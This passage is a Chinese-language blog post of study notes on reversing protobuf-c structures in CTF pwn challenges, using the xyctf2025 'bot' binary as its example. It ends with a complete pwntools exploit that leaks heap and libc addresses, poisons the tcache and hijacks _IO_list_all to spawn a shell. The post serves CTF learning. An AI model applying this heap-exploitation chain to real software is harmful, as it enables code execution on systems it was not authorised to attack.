class="line"><span class="comment">  * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field  </span></span><br><span class="line"><span class="comment">  * (the `has_MEMBER` field for optional members or the `n_MEMBER` field  </span></span><br><span class="line"><span class="comment">  * for repeated members or the case enum for oneofs).  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> <span class="type">unsigned</span>  quantifier_offset;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * The offset in bytes into the message&#x27;s C structure for the member  </span></span><br><span class="line"><span class="comment">  * itself.  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> <span class="type">unsigned</span>  offset;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * A type-specific descriptor.  </span></span><br><span class="line"><span class="comment">  *  </span></span><br><span class="line"><span class="comment">  * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the  </span></span><br><span class="line"><span class="comment">  * corresponding `ProtobufCEnumDescriptor`.  </span></span><br><span class="line"><span class="comment">  *  </span></span><br><span class="line"><span class="comment">  * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to  </span></span><br><span class="line"><span class="comment">  * the corresponding `ProtobufCMessageDescriptor`.  </span></span><br><span class="line"><span class="comment">  *  </span></span><br><span class="line"><span class="comment">  * Otherwise this field is NULL.  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">void</span>  *descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span>  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** The default value for this field, if defined. May be NULL. */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">void</span>  *default_value;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * A flag word. Zero or more of the bits defined in the  </span></span><br><span class="line"><span class="comment">  * `ProtobufCFieldFlag` enum may be set.  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> <span class="type">uint32_t</span>  flags;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** Reserved for future use. */</span>  </span><br><span class="line"> <span class="type">unsigned</span>  reserved_flags;  </span><br><span class="line"> <span class="comment">/** Reserved for future use. */</span>  </span><br><span class="line"> <span class="type">void</span>   *reserved2;  </span><br><span class="line"> <span class="comment">/** Reserved for future use. */</span>  </span><br><span class="line"> <span class="type">void</span>   *reserved3;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+<p>name 是字段名<br>id 是字段编号<br>label 是修饰符<br>type 是字段类型<br>default_value 在 proto2 存在，在 proto3 不存在，可以通过这个判断版本</p>
+<h4 id="Lable-and-Type"><a href="#Lable-and-Type" class="headerlink" title="Lable and Type"></a>Lable and Type</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ProtobufCLabel</span>&#123;</span>  </span><br><span class="line"> <span class="comment">/** A well-formed message must have exactly one of this field. */</span>  </span><br><span class="line"> PROTOBUF_C_LABEL_REQUIRED,  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * A well-formed message can have zero or one of this field (but not  </span></span><br><span class="line"><span class="comment">  * more than one).  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> PROTOBUF_C_LABEL_OPTIONAL,  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * This field can be repeated any number of times (including zero) in a  </span></span><br><span class="line"><span class="comment">  * well-formed message. The order of the repeated values will be  </span></span><br><span class="line"><span class="comment">  * preserved.  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> PROTOBUF_C_LABEL_REPEATED,  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * This field has no label. This is valid only in proto3 and is  </span></span><br><span class="line"><span class="comment">  * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> PROTOBUF_C_LABEL_NONE,  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ProtobufCType</span> &#123;</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span>  </span><br><span class="line"> PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCBinaryData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> len;                           <span class="comment">///&lt; Number of bytes in the `data` field.</span></span><br><span class="line">  <span class="type">uint8_t</span> *data;                        <span class="comment">///&lt; Data bytes.</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="ProtobufCMessage"><a href="#ProtobufCMessage" class="headerlink" title="ProtobufCMessage"></a>ProtobufCMessage</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessage</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">const</span> ProtobufCMessageDescriptor *descriptor;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_unknown_fields;</span><br><span class="line">  ProtobufCMessageUnknownField *unknown_fields;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="ProtobufCIntRange"><a href="#ProtobufCIntRange" class="headerlink" title="ProtobufCIntRange"></a>ProtobufCIntRange</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCIntRange</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> start_value;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> orig_index;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="ProtobufCMessageUnknownField"><a href="#ProtobufCMessageUnknownField" class="headerlink" title="ProtobufCMessageUnknownField"></a>ProtobufCMessageUnknownField</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageUnknownField</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">uint32_t</span> tag;</span><br><span class="line">	ProtobufCWireType wire_type;</span><br><span class="line">	<span class="type">size_t</span> len;</span><br><span class="line">	<span class="type">uint8_t</span> *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>以 xyctf2025 bot 为例子</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v7 = &amp;message_response__descriptor;</span><br></pre></td></tr></table></figure></div>
+<p>可以看到这样一个赋值语句,<br>点进去发现第一个值是 0x28AAEEF9<br>显然是 <code>ProtobufCMessageDescriptor</code><br>然后发现名为 Message_response 的 Message<br>通过 <code>n_fields</code> 字段发现有 4 个字段<br>根据 <code>fields</code> 字段来到各个字段的结构体 <code>ProtobufCFieldDescriptor</code><br>分析，四个字段分别是 id，receiver，status，error_message<br>发现其中还有 default_value 字段，是 proto2<br>可逆向出</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax=&quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">message Message_response&#123;</span><br><span class="line">    required int32 id = 1;</span><br><span class="line">    required string receiver = 2;</span><br><span class="line">    required int32 status_code = 3;</span><br><span class="line">    optional string error_message = 4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>同样的，发现了另一个 Message, 名为 Message_request</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">message Message_request&#123;</span><br><span class="line">    required int32 id = 1;</span><br><span class="line">    required string sender = 2;</span><br><span class="line">    required uint32 len = 3;</span><br><span class="line">    required bytes content = 4;</span><br><span class="line">    required int32 actionid = 5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>整合一下，写入一个文件</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">message Message_request&#123;</span><br><span class="line">    required int32 id = 1;</span><br><span class="line">    required string sender = 2;</span><br><span class="line">    required uint32 len = 3;</span><br><span class="line">    required bytes content = 4;</span><br><span class="line">    required int32 actionid = 5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Message_response&#123;</span><br><span class="line">    required int32 id = 1;</span><br><span class="line">    required string receiver = 2;</span><br><span class="line">    required int32 status_code = 3;</span><br><span class="line">    optional string error_message = 4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>笔者命名为了 demo.proto<br>使用 <code>protoc --c_out=. ./demo.proto</code> 和 <code>protoc --python_out=. ./demo.proto</code></p>
+<p>在当前目录生成了 c 文件和 python 文件<br>demo.pc-c.c 和 demo.pc-c.h<br>demo_pb2.py 和 __pycache__ 文件夹</p>
+<p>C 文件用于恢复符号，在其中可找到结构体 MessageRequest</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">MessageRequest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="type">int32_t</span> id;</span><br><span class="line">  <span class="type">char</span> *sender;</span><br><span class="line">  <span class="type">uint32_t</span> len;</span><br><span class="line">  ProtobufCBinaryData content;</span><br><span class="line">  <span class="type">int32_t</span> actionid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+<p>将这个结构体导入 ida，有助于逆向分析<br>题目漏洞利用不是本文重点，故不过多阐述</p>
+<p>生成的 python 文件是用于和题目交互的，<br>可通过 <code>import demo_pb2</code> 导入<br>例如，</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">msg = demo_pb2.Message_request()</span><br><span class="line">msg.<span class="built_in">id</span> = <span class="number">1</span></span><br><span class="line">msg.sender = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化</span></span><br><span class="line">x=msg.SerializeToString()</span><br></pre></td></tr></table></figure></div>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> demo_pb2 <span class="keyword">as</span> bot</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./bot&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b *$rebase(0x8515)\nb *$rebase(0x8382)&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>:<span class="built_in">int</span>,<span class="built_in">len</span>:<span class="built_in">int</span>,con</span>):</span><br><span class="line">    msg = bot.Message_request()</span><br><span class="line">    msg.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    msg.sender = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    msg.<span class="built_in">len</span> = <span class="built_in">len</span></span><br><span class="line">    msg.content = con</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;TESTTESTTEST!&#x27;</span>)</span><br><span class="line">    io.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span>:<span class="built_in">int</span></span>):</span><br><span class="line">    msg = bot.Message_request()</span><br><span class="line">    msg.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    msg.sender = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    msg.<span class="built_in">len</span> = <span class="number">666</span></span><br><span class="line">    msg.content = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;TESTTESTTEST!&#x27;</span>)</span><br><span class="line">    io.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_program</span>():</span><br><span class="line">    msg = bot.Message_request()</span><br><span class="line">    msg.<span class="built_in">id</span> = <span class="number">0</span></span><br><span class="line">    msg.sender = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    msg.<span class="built_in">len</span> = <span class="number">666</span></span><br><span class="line">    msg.content = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;TESTTESTTEST!&#x27;</span>)</span><br><span class="line">    io.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;BOT MSG\n&#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">con = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x2a0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x29d90</span></span><br><span class="line">info(<span class="string">f&#x27;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">con = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x1A00</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">con = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">con = con.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">con += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">add(<span class="number">1</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">con = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x1B00</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">con = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0xE0</span></span><br><span class="line">con += p64(heap_base + <span class="number">0x1A00</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">con = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x1C00</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">con = <span class="string">b&#x27;  sh\0\0\0\0&#x27;</span></span><br><span class="line">con = con.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">con += p64(<span class="number">1</span>)</span><br><span class="line">con = con.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">con += p64(heap_base + <span class="number">0x1B00</span>)</span><br><span class="line">con = con.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">con += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">con = con.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">con += p64(libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>])</span><br><span class="line">add(<span class="number">1</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">con = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">con += p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">add(<span class="number">0</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">con = p64(heap_base + <span class="number">0x1C00</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="built_in">len</span>(con), con)</span><br><span class="line"></span><br><span class="line">exit_program()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> proto buf 学习笔记</li>
+        <li><strong>Author:</strong> Findkey</li>
+        <li><strong>Created at
+                :</strong> 2025-07-21 19:18:34</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-02 23:08:37
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://find-key.github.io/2025/07/21/proto/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Protobuf/">#Protobuf</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/10/13/YCB-PWN-some-WP/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">羊城杯-PWN-部分WP</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/04/10/xyctf2024/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">XYCTF2024 复现</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">proto buf 学习笔记</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-protoc"><span class="nav-text">安装 protoc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-protobuf-c"><span class="nav-text">安装 protobuf-c</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85python%E7%9A%84-protobuf-%E5%BA%93"><span class="nav-text">安装python的 protobuf 库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proto-buf-%E5%88%86%E6%9E%90"><span class="nav-text">proto buf 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">相关结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example"><span class="nav-text">example</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
